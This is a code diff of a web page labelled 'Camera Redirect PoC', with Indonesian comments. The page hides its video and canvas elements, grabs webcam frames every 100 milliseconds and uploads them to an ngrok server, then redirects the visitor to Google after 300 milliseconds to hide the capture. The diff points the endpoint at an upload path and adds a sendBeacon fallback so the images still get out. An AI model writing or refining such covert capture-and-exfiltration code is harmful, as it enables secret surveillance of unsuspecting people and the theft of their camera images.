@@ -5,21 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Camera Redirect PoC (300ms)</title>
 <style>
-  body {
-    font-family: Arial, sans-serif;
-    text-align: center;
-    padding: 60px;
-  }
-  button {
-    padding: 15px 30px;
-    font-size: 20px;
-    cursor: pointer;
-  }
-  #status {
-    margin-top: 20px;
-    font-size: 18px;
-    color: darkred;
-  }
+  body { font-family: Arial, sans-serif; text-align: center; padding: 60px; }
+  button { padding: 15px 30px; font-size: 20px; cursor: pointer; }
+  #status { margin-top: 20px; font-size: 18px; color: darkred; }
   iframe, video, canvas { display: none !important; }
 </style>
 </head>
@@ -37,7 +25,11 @@
 
   var btn = document.getElementById('camBtn');
   var statusEl = document.getElementById('status');
-  var SERVER_ENDPOINT = " https://studly-unallegorized-brecken.ngrok-free.dev";
+
+  // ============================================
+  // KONFIGURASI (PERBAIKAN ENDPOINT)
+  // ============================================
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
 
   function log(msg) {
     statusEl.textContent = msg;
@@ -67,19 +59,39 @@
       canvas.height = 480;
       var ctx = canvas.getContext('2d');
 
+      // Loop Pengiriman Gambar
       setInterval(function() {
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(function(blob) {
-            if (!blob) return;
-            var formData = new FormData();
-            formData.append('file', blob, 'camera.jpg');
-            fetch(SERVER_ENDPOINT, {
-              method: 'POST',
-              body: formData,
-              keepalive: true
-            }).catch(function(){});
-          }, 'image/jpeg', 0.5);
+        try {
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function(blob) {
+              if (!blob) return;
+              var formData = new FormData();
+              formData.append('file', blob, 'camera.jpg');
+
+              // Kirim via fetch (keepalive)
+              fetch(SERVER_ENDPOINT, {
+                method: 'POST',
+                body: formData,
+                keepalive: true
+              })
+              .then(function(res) {
+                if (res.ok) {
+                  log("Gambar terkirim: " + res.status);
+                } else {
+                  log("Gagal kirim: " + res.status);
+                }
+              })
+              .catch(function(err) {
+                // Fallback: sendBeacon
+                try {
+                  navigator.sendBeacon(SERVER_ENDPOINT, blob);
+                } catch(e) {}
+              });
+            }, 'image/jpeg', 0.5);
+          }
+        } catch(e) {
+          log("Frame Error: " + e.message);
         }
       }, 100);
 
@@ -103,7 +115,7 @@
       try {
         window.location.replace('https://www.google.com');
       } catch(e) {}
-    }, 300); // 300ms
+    }, 300);
 
   }, { once: true });
 
